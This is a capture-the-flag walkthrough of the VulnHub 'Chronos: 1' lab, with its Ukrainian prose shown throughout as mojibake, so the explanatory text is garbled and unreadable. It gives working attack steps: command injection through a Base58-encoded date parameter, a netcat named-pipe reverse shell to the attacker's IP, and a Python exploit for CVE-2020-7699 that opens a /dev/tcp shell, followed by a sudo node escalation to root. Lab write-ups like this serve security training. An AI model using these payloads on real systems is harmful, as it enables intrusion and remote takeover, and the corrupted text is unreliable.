# Chronos: 1 ‚Äî –†–æ–∑–≥–æ—Ä–Ω—É—Ç–∏–π —Ä–æ–∑–±—ñ—Ä CTF

–í —Ü—å–æ–º—É –¥–æ–∫—É–º–µ–Ω—Ç—ñ –Ω–∞–≤–µ–¥–µ–Ω–æ —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è –¥–æ –∑–∞–≤–¥–∞–Ω–Ω—è **Capture the Flag (CTF)** –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **"Chronos: 1"**, –æ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω–µ –Ω–∞ —Å–∞–π—Ç—ñ **VulnHub**. –†—ñ–≤–µ–Ω—å —Å–∫–ª–∞–¥–Ω–æ—Å—Ç—ñ —Ü—å–æ–≥–æ CTF **–°–ï–†–ï–î–ù–Ü–ô**, –∞ –º–µ—Ç–∞ - –æ—Ç—Ä–∏–º–∞—Ç–∏ **root-–¥–æ—Å—Ç—É–ø** –¥–æ —Ü—ñ–ª—å–æ–≤–æ—ó –º–∞—à–∏–Ω–∏ —Ç–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ñ—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–ª–∞–≥.

–î–ª—è –ø—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è —Ü—å–æ–≥–æ CTF –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –º–∞—Ç–∏ **–±–∞–∑–æ–≤—ñ –∑–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ Linux**, **–Ω–∞–≤–∏—á–∫–∏ —Ä–æ–±–æ—Ç–∏ –∑ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è** —Ç–∞ —Ä–æ–∑—É–º—ñ–Ω–Ω—è **–≤–µ–±-–≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π**. –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ CTF –º–æ–∂–Ω–∞ —Ç—É—Ç: https://www.vulnhub.com/entry/chronos-1,735/

> ‚ö†Ô∏è **–ü—Ä–∏–º—ñ—Ç–∫–∞**: –î–ª—è –∑–∞–ø—É—Å–∫—É –≤—Å—ñ—Ö —Ü–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –º–∞—à–∏–Ω –±—É–ª–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ **Oracle VirtualBox**. –î–ª—è –ø—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è CTF –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ **Kali Linux / ParrotOS** —è–∫ –∞—Ç–∞–∫—É—é—á—É –º–∞—à–∏–Ω—É. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –º–µ—Ç–æ–¥–∏–∫–∏ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ **–≤–∏–∫–ª—é—á–Ω–æ –¥–ª—è –æ—Å–≤—ñ—Ç–Ω—ñ—Ö —Ü—ñ–ª–µ–π**.  
> **–í—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω—ñ—Å—Ç—å –∑–∞ —ó—Ö –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è –ø—Ä–æ—Ç–∏ –±—É–¥—å-—è–∫–∏—Ö —ñ–Ω—à–∏—Ö —Ü—ñ–ª–µ–π –±—É–¥–µ –≤–∏–∑–Ω–∞—á–∞—Ç–∏—Å—å –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ —á–∏–Ω–Ω–æ–º—É –∑–∞–∫–æ–Ω–æ–¥–∞–≤—Å—Ç–≤—É.**

---

## **–ö–æ—Ä–æ—Ç–∫–∏–π –æ–≥–ª—è–¥ –∫—Ä–æ–∫—ñ–≤ –≤–∏—Ä—ñ—à–µ–Ω–Ω—è CTF**

1Ô∏è‚É£ –í–∏—è–≤–∏—Ç–∏ **IP-–∞–¥—Ä–µ—Å—É —Ü—ñ–ª—å–æ–≤–æ—ó –º–∞—à–∏–Ω–∏** —Ç–∞ –ø—Ä–æ—Å–∫–∞–Ω—É–≤–∞—Ç–∏ **–≤—ñ–¥–∫—Ä–∏—Ç—ñ –ø–æ—Ä—Ç–∏** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **nmap**.  
2Ô∏è‚É£ –î–æ—Å–ª—ñ–¥–∏—Ç–∏ **–≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫** –Ω–∞ –ø–æ—Ä—Ç—É 80 —Ç–∞ –≤–∏—è–≤–∏—Ç–∏ –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏–π –∑–∞–ø–∏—Ç –¥–æ –ø–æ—Ä—Ç—É 8000.  
3Ô∏è‚É£ –ü—Ä–æ–≤–µ—Å—Ç–∏ **–º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—é User-Agent** —Ç–∞ –≤–∏—è–≤–∏—Ç–∏ **Command Injection**.  
4Ô∏è‚É£ –û—Ç—Ä–∏–º–∞—Ç–∏ **Reverse Shell** —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å Command Injection.  
5Ô∏è‚É£ –ü—Ä–æ–≤–µ—Å—Ç–∏ **–µ—Å–∫–∞–ª–∞—Ü—ñ—é –ø—Ä–∏–≤—ñ–ª–µ—ó–≤** —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å **CVE-2020-7699** —É –º–æ–¥—É–ª—ñ express-fileupload.  
6Ô∏è‚É£ –û—Ç—Ä–∏–º–∞—Ç–∏ **root-–¥–æ—Å—Ç—É–ø** —Ç–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ **—Ñ—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–ª–∞–≥**.

---

## **–†–æ–∑–±—ñ—Ä CTF –∫—Ä–æ–∫ –∑–∞ –∫—Ä–æ–∫–æ–º**

### **–ö—Ä–æ–∫ 1: –í–∏—è–≤–ª–µ–Ω–Ω—è IP-–∞–¥—Ä–µ—Å–∏ —Ç–∞ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤**

–ü—ñ—Å–ª—è –∑–∞–ø—É—Å–∫—É –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–æ—ó –º–∞—à–∏–Ω–∏ —É **VirtualBox** –ø–µ—Ä—à–∏–º –∫—Ä–æ–∫–æ–º —î –≤–∏—è–≤–ª–µ–Ω–Ω—è —ó—ó IP-–∞–¥—Ä–µ—Å–∏ –≤ –ª–æ–∫–∞–ª—å–Ω—ñ–π –º–µ—Ä–µ–∂—ñ. –î–ª—è —Ü—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç **netdiscover**:

```bash
sudo netdiscover -r 10.0.2.0/24
```

üìå **–†–µ–∑—É–ª—å—Ç–∞—Ç**: –í–∏—è–≤–ª–µ–Ω–æ —Ü—ñ–ª—å–æ–≤—É –º–∞—à–∏–Ω—É –∑ IP-–∞–¥—Ä–µ—Å–æ—é **10.0.2.5**.

‚ö†Ô∏è **–ü—Ä–∏–º—ñ—Ç–∫–∞**: IP-–∞–¥—Ä–µ—Å–∏ –∞—Ç–∞–∫—É—é—á–æ—ó —Ç–∞ —Ü—ñ–ª—å–æ–≤–æ—ó –º–∞—à–∏–Ω –º–æ–∂—É—Ç—å –≤—ñ–¥—Ä—ñ–∑–Ω—è—Ç–∏—Å—è –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –≤–∞—à–æ—ó –º–µ—Ä–µ–∂–µ–≤–æ—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó.

–ù–∞—Å—Ç—É–ø–Ω–∏–º –∫—Ä–æ–∫–æ–º –≤–∏–∫–æ–Ω—É—î–º–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö –ø–æ—Ä—Ç—ñ–≤ —Ç–∞ —Å–µ—Ä–≤—ñ—Å—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **nmap**:

```bash
sudo nmap -sV 10.0.2.5
```

üìå **–†–µ–∑—É–ª—å—Ç–∞—Ç —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è**:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    Node.js Express framework
```

–í–∏—è–≤–ª–µ–Ω–æ —Ç—Ä–∏ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –ø–æ—Ä—Ç–∏:

- **–ü–æ—Ä—Ç 22** ‚Äî SSH-—Å–µ—Ä–≤—ñ—Å
- **–ü–æ—Ä—Ç 80** ‚Äî Apache HTTP —Å–µ—Ä–≤–µ—Ä
- **–ü–æ—Ä—Ç 8000** ‚Äî Node.js Express framework

---

### **–ö—Ä–æ–∫ 2: –î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –≤–µ–±-–¥–æ–¥–∞—Ç–∫—É –Ω–∞ –ø–æ—Ä—Ç—É 80**

–í—ñ–¥–∫—Ä–∏–≤–∞—î–º–æ —É –±—Ä–∞—É–∑–µ—Ä—ñ –∞–¥—Ä–µ—Å—É **http://10.0.2.5/** —Ç–∞ –±–∞—á–∏–º–æ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É –∑ –Ω–∞–∑–≤–æ—é "Chronos".

–ü—Ä–∏ –ø–µ—Ä–µ–≥–ª—è–¥—ñ **–≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É —Å—Ç–æ—Ä—ñ–Ω–∫–∏** (View Page Source) –∑–Ω–∞—Ö–æ–¥–∏–º–æ –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏–π JavaScript-–∫–æ–¥, —è–∫–∏–π –≤–∏–∫–æ–Ω—É—î –∑–∞–ø–∏—Ç –¥–æ —Å–µ—Ä–≤–µ—Ä—É:

```
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
'User-Agent': 'Chronos'
```

üìå **–í–∞–∂–ª–∏–≤—ñ –¥–µ—Ç–∞–ª—ñ**:

- –ó–∞–ø–∏—Ç –π–¥–µ –Ω–∞ **–ø–æ—Ä—Ç 8000** (Node.js —Å–µ—Ä–≤—ñ—Å)
- –ü–∞—Ä–∞–º–µ—Ç—Ä `format` –º—ñ—Å—Ç–∏—Ç—å –Ω–µ–∑—Ä–æ–∑—É–º—ñ–ª–∏–π —Ä—è–¥–æ–∫: `4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`
- –ó–∞–≥–æ–ª–æ–≤–æ–∫ `User-Agent` –º–∞—î –∑–Ω–∞—á–µ–Ω–Ω—è **"Chronos"**

---

### **–ö—Ä–æ–∫ 3: –ê–Ω–∞–ª—ñ–∑ –∑–∞–ø–∏—Ç—É —Ç–∞ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—è User-Agent**

–°–ø—Ä–æ–±—É—î–º–æ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ URL –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ —É –±—Ä–∞—É–∑–µ—Ä—ñ:

```
http://10.0.2.5:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
```

üìå **–†–µ–∑—É–ª—å—Ç–∞—Ç**: –û—Ç—Ä–∏–º—É—î–º–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å **"Permission Denied"**.

–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–≤—ñ—Ä—è—î –∑–∞–≥–æ–ª–æ–≤–æ–∫ **User-Agent**. –í–∏–∫–æ—Ä–∏—Å—Ç–∞—î–º–æ **Burp Suite** –¥–ª—è –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞–ø–∏—Ç—É:

1. –ù–∞–ª–∞—à—Ç–æ–≤—É—î–º–æ –±—Ä–∞—É–∑–µ—Ä –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø—Ä–æ–∫—Å—ñ Burp Suite
2. –ü–µ—Ä–µ—Ö–æ–ø–ª—é—î–º–æ –∑–∞–ø–∏—Ç –¥–æ `http://10.0.2.5:8000/date?format=...`
3. –ó–º—ñ–Ω—é—î–º–æ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `User-Agent` –Ω–∞ –∑–Ω–∞—á–µ–Ω–Ω—è **"Chronos"**
4. –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –º–æ–¥–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç

üìå **–†–µ–∑—É–ª—å—Ç–∞—Ç**: –û—Ç—Ä–∏–º—É—î–º–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –∑ –ø–æ—Ç–æ—á–Ω–æ—é –¥–∞—Ç–æ—é —Ç–∞ —á–∞—Å–æ–º:

```
Today is Sunday, October 12, 2025 13:47:41.
```

---

### **–ö—Ä–æ–∫ 4: –í–∏—è–≤–ª–µ–Ω–Ω—è Command Injection —á–µ—Ä–µ–∑ –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è Base58**

–ù–µ–∑—Ä–æ–∑—É–º—ñ–ª–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä `4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL` –≤–∏–≥–ª—è–¥–∞—î —è–∫ –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–π —Ä—è–¥–æ–∫. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ–Ω–ª–∞–π–Ω-—ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è, –≤–∏—è–≤–ª—è—î–º–æ, —â–æ —Ü–µ **Base58**-–∫–æ–¥—É–≤–∞–Ω–Ω—è:

üìå **–î–µ–∫–æ–¥–æ–≤–∞–Ω–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç**:

```
'+Today is %A, %B %d, %Y %H:%M:%S.'
```

–¶–µ —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥–∏ `date` —É Linux! –°–ø—Ä–æ–±—É—î–º–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ **Command Injection**, –¥–æ–¥–∞–≤—à–∏ –∫–æ–º–∞–Ω–¥—É `ls -la`:

**Payload**:

```bash
'+Today is %A, %B %d, %Y %H:%M:%S.';ls -la
```

–ö–æ–¥—É—î–º–æ —Ü–µ–π —Ä—è–¥–æ–∫ —É **Base58**:

```
ev6bGy99wjnctA21ATvLR8Xkptotq1Ssu3SZR3efG68AVURJRzjBHQoTn
```

–í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –∑–∞–ø–∏—Ç —á–µ—Ä–µ–∑ Burp Suite:

```
http://10.0.2.5:8000/date?format=ev6bGy99wjnctA21ATvLR8Xkptotq1Ssu3SZR3efG68AVURJRzjBHQoTn
```

üìå **–†–µ–∑—É–ª—å—Ç–∞—Ç**: –£ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –æ—Ç—Ä–∏–º—É—î–º–æ –≤–∏–≤—ñ–¥ –∫–æ–º–∞–Ω–¥–∏ `ls -la`:

```
Today is Sunday, October 12, 2025 13:58:21.
total 56
drwxr-xr-x  3 www-data www-data  4096 Aug  3  2021 .
drwxr-xr-x  4 root     root      4096 Jul 30  2021 ..
-rw-r--r--  1 www-data www-data  1365 Aug  3  2021 app.js
drwxr-xr-x 56 www-data www-data  4096 Jul 30  2021 node_modules
-rw-r--r--  1 www-data www-data    97 Jul 30  2021 package.json
-rw-r--r--  1 www-data www-data 33602 Jul 30  2021 package-lock.json
```

‚úÖ **Command Injection –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–æ!**

---

### **–ö—Ä–æ–∫ 5: –û—Ç—Ä–∏–º–∞–Ω–Ω—è Reverse Shell**

–ù–∞ –∞—Ç–∞–∫—É—é—á—ñ–π –º–∞—à–∏–Ω—ñ –∑–∞–ø—É—Å–∫–∞—î–º–æ **netcat listener**:

```bash
sudo ncat -l -p 8020
```

–°—Ç–≤–æ—Ä—é—î–º–æ payload –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.4 8020 >/tmp/f
```

‚ö†Ô∏è **–í–∞–∂–ª–∏–≤–æ**: –ó–∞–º—ñ–Ω—ñ—Ç—å `10.0.2.4` –Ω–∞ IP-–∞–¥—Ä–µ—Å—É –≤–∞—à–æ—ó –∞—Ç–∞–∫—É—é—á–æ—ó –º–∞—à–∏–Ω–∏.

–ö–æ–¥—É—î–º–æ payload —É **Base58**:

```
3WEL9tDt4agr4yQoWrnVmQpEvrDFh8qn8EWtn6ysjwJas1VRBvP5LUEkfUa2SecbKCGvz1Q6ykdYZf3vXYi3D3z4GKAUF2bPsyvZiNH
```

–í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –∑–∞–ø–∏—Ç —á–µ—Ä–µ–∑ Burp Suite –∑ —Ü–∏–º payload.

üìå **–†–µ–∑—É–ª—å—Ç–∞—Ç**: –£ —Ç–µ—Ä–º—ñ–Ω–∞–ª—ñ –∑ netcat –æ—Ç—Ä–∏–º—É—î–º–æ **reverse shell**!

```bash
$ pwd
/opt/chronos
```

---

### **–ö—Ä–æ–∫ 6: –î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ**

–ü—ñ—Å–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ—Å–ª—ñ–¥–∂—É—î–º–æ —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É:

```bash
$ ls -la /opt/
chronos
chronos-v2
```

–í–∏—è–≤–ª—è—î–º–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é `/opt/chronos-v2/backend/`. –ü–µ—Ä–µ–≥–ª—è–¥–∞—î–º–æ —Ñ–∞–π–ª `package.json`:

```bash
$ cat /opt/chronos-v2/backend/package.json
```

üìå **–í–∞–∂–ª–∏–≤–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è**: –í–∏—è–≤–ª–µ–Ω–æ –º–æ–¥—É–ª—å **express-fileupload –≤–µ—Ä—Å—ñ—ó 1.1.7-alpha.3**, —è–∫–∏–π –º–∞—î –∫—Ä–∏—Ç–∏—á–Ω—É –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å:

- **CVE-2020-7699** ‚Äî Remote Code Execution —á–µ—Ä–µ–∑ Prototype Pollution
- **CWE-400** ‚Äî Uncontrolled Resource Consumption

---

### **–ö—Ä–æ–∫ 7: –ï—Å–∫–∞–ª–∞—Ü—ñ—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —á–µ—Ä–µ–∑ CVE-2020-7699**

–ù–∞ –∞—Ç–∞–∫—É—é—á—ñ–π –º–∞—à–∏–Ω—ñ –∑–∞–ø—É—Å–∫–∞—î–º–æ –Ω–æ–≤–∏–π **netcat listener** –Ω–∞ —ñ–Ω—à–æ–º—É –ø–æ—Ä—Ç—É:

```bash
sudo ncat -l -p 8021
```

–£ –ø–æ—Ç–æ—á–Ω–æ–º—É reverse shell (–ø–æ—Ä—Ç 8020) –≤–∏–∫–æ–Ω—É—î–º–æ –µ–∫—Å–ø–ª–æ–π—Ç –¥–ª—è **CVE-2020-7699**:

```bash
python3 -c "import requests; cmd='bash -c \"bash -i >& /dev/tcp/10.0.2.4/8021 0>&1\"'; requests.post('http://127.0.0.1:8080', files={'__proto__.outputFunctionName': (None, f\"x;process.mainModule.require('child_process').exec('{cmd}');x\")}); requests.get('http://127.0.0.1:8080')"
```

‚ö†Ô∏è **–í–∞–∂–ª–∏–≤–æ**: –ó–∞–º—ñ–Ω—ñ—Ç—å `10.0.2.4` –Ω–∞ IP –≤–∞—à–æ—ó –∞—Ç–∞–∫—É—é—á–æ—ó –º–∞—à–∏–Ω–∏.

üìå **–†–µ–∑—É–ª—å—Ç–∞—Ç**: –£ –Ω–æ–≤–æ–º—É —Ç–µ—Ä–º—ñ–Ω–∞–ª—ñ (–ø–æ—Ä—Ç 8021) –æ—Ç—Ä–∏–º—É—î–º–æ shell –∑ –ø—ñ–¥–≤–∏—â–µ–Ω–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏!

–¢–µ–ø–µ—Ä –º–æ–∂–Ω–∞ –∑–∞–∫—Ä–∏—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—î –∑'—î–¥–Ω–∞–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç—É 8020.

---

### **–ö—Ä–æ–∫ 8: –í–∏—Ö—ñ–¥ –∑ –æ–±–º–µ–∂–µ–Ω–æ–≥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è root**

–°—Ç–≤–æ—Ä—é—î–º–æ –ø–æ–≤–Ω–æ—Ü—ñ–Ω–Ω—É —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—É –æ–±–æ–ª–æ–Ω–∫—É:

```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

–¢–µ–ø–µ—Ä –æ—Ç—Ä–∏–º—É—î–º–æ –¥–æ—Å—Ç—É–ø –∑ –ø—Ä–∞–≤–∞–º–∏ **root**:

```bash
# whoami
root
```

---

### **–ö—Ä–æ–∫ 9: –ß–∏—Ç–∞–Ω–Ω—è —Ñ—ñ–Ω–∞–ª—å–Ω–æ–≥–æ —Ñ–ª–∞–≥—É**

–ü–µ—Ä–µ—Ö–æ–¥–∏–º–æ –¥–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó `/root/` —Ç–∞ —á–∏—Ç–∞—î–º–æ —Ñ—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–ª–∞–≥:

```bash
# cat /root/root.txt
YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
```

–î–µ–∫–æ–¥—É—î–º–æ —Ñ–ª–∞–≥ –∑ **Base64**:

```bash
# echo "YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK" | base64 -d
apopse siopi mazeuoume oneira
```

‚úÖ **–§—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–ª–∞–≥ –æ—Ç—Ä–∏–º–∞–Ω–æ! CTF –∑–∞–≤–µ—Ä—à–µ–Ω–æ!** üéØ

---

## **–í–∏—Å–Ω–æ–≤–æ–∫**

**–©–æ –±—É–ª–æ –∑—Ä–æ–±–ª–µ–Ω–æ?**

‚úîÔ∏è –í–∏—è–≤–ª–µ–Ω–æ IP-–∞–¥—Ä–µ—Å—É —Ü—ñ–ª—å–æ–≤–æ—ó –º–∞—à–∏–Ω–∏ —Ç–∞ –ø—Ä–æ—Å–∫–∞–Ω–æ–≤–∞–Ω–æ –ø–æ—Ä—Ç–∏  
‚úîÔ∏è –î–æ—Å–ª—ñ–¥–∂–µ–Ω–æ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫ —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–æ –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏–π –∑–∞–ø–∏—Ç  
‚úîÔ∏è –ü—Ä–æ–≤–µ–¥–µ–Ω–æ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—é User-Agent –¥–ª—è –æ–±—Ö–æ–¥—É –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏  
‚úîÔ∏è –í–∏—è–≤–ª–µ–Ω–æ —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ Command Injection —á–µ—Ä–µ–∑ Base58-–¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è  
‚úîÔ∏è –û—Ç—Ä–∏–º–∞–Ω–æ Reverse Shell –∑ –ø—Ä–∞–≤–∞–º–∏ www-data  
‚úîÔ∏è –î–æ—Å–ª—ñ–¥–∂–µ–Ω–æ —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–æ –≤—Ä–∞–∑–ª–∏–≤–∏–π –º–æ–¥—É–ª—å express-fileupload  
‚úîÔ∏è –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –µ–∫—Å–ø–ª–æ–π—Ç –¥–ª—è CVE-2020-7699 (Prototype Pollution)  
‚úîÔ∏è –û—Ç—Ä–∏–º–∞–Ω–æ root-–¥–æ—Å—Ç—É–ø —Ç–∞ –ø—Ä–æ—á–∏—Ç–∞–Ω–æ —Ñ—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–ª–∞–≥

## **–¶–µ–π CTF —î –ø—Ä–∏–∫–ª–∞–¥–æ–º –Ω–∞–≤—á–∞–ª—å–Ω–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è** –¥–ª—è –≤—ñ–¥–ø—Ä–∞—Ü—é–≤–∞–Ω–Ω—è –Ω–∞–≤–∏—á–æ–∫ **–µ—Ç–∏—á–Ω–æ–≥–æ —Ö–∞–∫—ñ–Ω–≥—É**, —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è —Ç–∞ –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —á–µ—Ä–µ–∑ —Ä–µ–∞–ª—å–Ω—ñ CVE-–≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.
